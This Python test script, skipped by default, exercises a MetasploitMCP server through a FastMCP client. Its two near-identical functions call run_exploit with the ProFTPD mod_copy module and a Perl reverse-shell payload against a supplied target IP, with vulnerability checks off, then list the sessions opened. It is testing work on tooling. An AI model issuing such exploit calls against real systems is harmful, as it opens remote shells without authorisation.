#!/usr/bin/env python3
"""
FastMCP client test for MetasploitMCP server.
Uses the official FastMCP client to test the console output capture fix.
"""

import asyncio
import json
import logging
import sys
import pytest
from typing import Dict, Any

# Skip this test by default - requires external dependencies
pytestmark = pytest.mark.skip(reason="Manual test - requires FastMCP client and Metasploit RPC")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

async def test_fastmcp_client(target_ip: str, server_url: str = "http://127.0.0.1:8088/mcp"):
    """Test the MetasploitMCP server using FastMCP client."""
    # Import here to avoid import errors when skipping
    from fastmcp import Client
    
    # Create FastMCP client with HTTP URL
    client = Client(server_url)
    
    try:
        async with client:
            logger.info(f"Connected to MetasploitMCP server at {server_url}")
            
            # Test connection
            await client.ping()
            logger.info("✅ Server ping successful")
            
            # List available tools
            tools = await client.list_tools()
            tool_names = [tool.name for tool in tools]
            logger.info(f"Available tools: {tool_names}")
        
    
            # Test 2: Run an exploit (more comprehensive test)
            logger.info("\n" + "="*50)
            logger.info("TEST 2: Running exploit module")
            logger.info("="*50)
            
            try:
                exploit_result = await client.call_tool(
                    "run_exploit",
                    arguments={
                        "module_name": "unix/ftp/proftpd_modcopy_exec",
                        "options": {
                            "RHOSTS": target_ip,
                            "RPORT": 80,
                            "SITEPATH": "/var/www/html"
                        },
                        "payload_name": "cmd/unix/reverse_perl",
                        "payload_options": f"LHOST={target_ip},LPORT=4444",
                        "run_as_job": False,
                        "check_vulnerability": False,
                        "timeout_seconds": 90
                    }
                )
                
                logger.info("Exploit result:")
                print(exploit_result)
                #print(json.dumps(exploit_result, indent=2))
                
                # Check if we got meaningful output
                if "content" in exploit_result and exploit_result["content"]:
                    content = exploit_result["content"][0]
                    if "text" in content:
                        result_data = json.loads(content["text"])
                        module_output = result_data.get("module_output", "")
                        status = result_data.get("status", "")
                        
                        logger.info(f"Exploit status: {status}")
                        logger.info(f"Module output length: {len(module_output)} characters")
                        
                        if len(module_output) > 100:
                            logger.info("✅ Exploit test PASSED - Got substantial output")
                            logger.info("First 500 characters of output:")
                            print(module_output[:500])
                            if len(module_output) > 500:
                                print("...")
                        else:
                            logger.warning("⚠️ Exploit test PARTIAL - Output may be incomplete")
                            logger.info(f"Output: {module_output}")
                        
                        # Check for specific exploit indicators
                        if any(indicator in module_output.lower() for indicator in 
                              ["session", "opened", "exploit", "handler", "payload", "connected"]):
                            logger.info("✅ Exploit test PASSED - Found exploit execution indicators")
                        else:
                            logger.warning("⚠️ Exploit test PARTIAL - No clear exploit indicators found")
                            
                    else:
                        logger.error("❌ Exploit test FAILED - No text content in result")
                else:
                    logger.error("❌ Exploit test FAILED - No content in result")
                    
            except Exception as e:
                logger.error(f"❌ Exploit test FAILED - Exception: {e}")
            
            # Test 3: Session management
            logger.info("\n" + "="*50)
            logger.info("TEST 3: Testing session management")
            logger.info("="*50)
            
            try:
                session_result = await client.call_tool("list_sessions", arguments={})
                logger.info("Session management result:")
                print(json.dumps(session_result, indent=2))
                logger.info("✅ Session management test completed")
                
            except Exception as e:
                logger.error(f"❌ Session management test FAILED - Exception: {e}")
            
            logger.info("\n" + "="*50)
            logger.info("FastMCP client test completed")
            logger.info("="*50)
            
    except Exception as e:
        logger.error(f"FastMCP client test failed: {e}")
        raise

async def test_fastmcp_client_as_job(target_ip: str, server_url: str = "http://127.0.0.1:8088/mcp"):
    """Test the MetasploitMCP server using FastMCP client."""
    # Import here to avoid import errors when skipping
    from fastmcp import Client
    
    # Create FastMCP client with HTTP URL
    client = Client(server_url)
    
    try:
        async with client:
            logger.info(f"Connected to MetasploitMCP server at {server_url}")
            
            # Test connection
            await client.ping()
            logger.info("✅ Server ping successful")
            
            # List available tools
            tools = await client.list_tools()
            tool_names = [tool.name for tool in tools]
            logger.info(f"Available tools: {tool_names}")
        
    
            # Test 2: Run an exploit (more comprehensive test)
            logger.info("\n" + "="*50)
            logger.info("TEST 2: Running exploit module")
            logger.info("="*50)
            
            try:
                exploit_result = await client.call_tool(
                    "run_exploit",
                    arguments={
                        "module_name": "unix/ftp/proftpd_modcopy_exec",
                        "options": {
                            "RHOSTS": target_ip,
                            "RPORT": 80,
                            "SITEPATH": "/var/www/html"
                        },
                        "payload_name": "cmd/unix/reverse_perl",
                        "payload_options": f"LHOST={target_ip},LPORT=4444",
                        "run_as_job": True,
                        "check_vulnerability": False,
                        "timeout_seconds": 90
                    }
                )
                
                logger.info("Exploit result:")
                print(exploit_result)
                #print(json.dumps(exploit_result, indent=2))
                
                # Check if we got meaningful output
                if "content" in exploit_result and exploit_result["content"]:
                    content = exploit_result["content"][0]
                    if "text" in content:
                        result_data = json.loads(content["text"])
                        module_output = result_data.get("module_output", "")
                        status = result_data.get("status", "")
                        
                        logger.info(f"Exploit status: {status}")
                        logger.info(f"Module output length: {len(module_output)} characters")
                        
                        if len(module_output) > 100:
                            logger.info("✅ Exploit test PASSED - Got substantial output")
                            logger.info("First 500 characters of output:")
                            print(module_output[:500])
                            if len(module_output) > 500:
                                print("...")
                        else:
                            logger.warning("⚠️ Exploit test PARTIAL - Output may be incomplete")
                            logger.info(f"Output: {module_output}")
                        
                        # Check for specific exploit indicators
                        if any(indicator in module_output.lower() for indicator in 
                              ["session", "opened", "exploit", "handler", "payload", "connected"]):
                            logger.info("✅ Exploit test PASSED - Found exploit execution indicators")
                        else:
                            logger.warning("⚠️ Exploit test PARTIAL - No clear exploit indicators found")
                            
                    else:
                        logger.error("❌ Exploit test FAILED - No text content in result")
                else:
                    logger.error("❌ Exploit test FAILED - No content in result")
                    
            except Exception as e:
                logger.error(f"❌ Exploit test FAILED - Exception: {e}")
            
            # Test 3: Session management
            logger.info("\n" + "="*50)
            logger.info("TEST 3: Testing session management")
            logger.info("="*50)
            
            try:
                session_result = await client.call_tool("list_sessions", arguments={})
                logger.info("Session management result:")
                print(json.dumps(session_result, indent=2))
                logger.info("✅ Session management test completed")
                
            except Exception as e:
                logger.error(f"❌ Session management test FAILED - Exception: {e}")
            
            logger.info("\n" + "="*50)
            logger.info("FastMCP client test completed")
            logger.info("="*50)
            
    except Exception as e:
        logger.error(f"FastMCP client test failed: {e}")
        raise


async def main():
    """Main test function."""
    if len(sys.argv) < 2:
        print("Usage: python test_fastmcp_client.py <target_ip> [server_url]")
        print("Example: python test_fastmcp_client.py 192.168.1.100")
        print("Example: python test_fastmcp_client.py 192.168.1.100 http://127.0.0.1:8088")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    server_url = sys.argv[2] if len(sys.argv) > 2 else "http://127.0.0.1:8088/mcp"
    
    logger.info(f"Starting MetasploitMCP FastMCP client test")
    logger.info(f"Target IP: {target_ip}")
    logger.info(f"Server URL: {server_url}")
    
    try:
        await test_fastmcp_client(target_ip, server_url)
        await test_fastmcp_client_as_job(target_ip, server_url)
        logger.info("✅ All tests completed successfully")
        
    except Exception as e:
        logger.error(f"❌ Test failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())
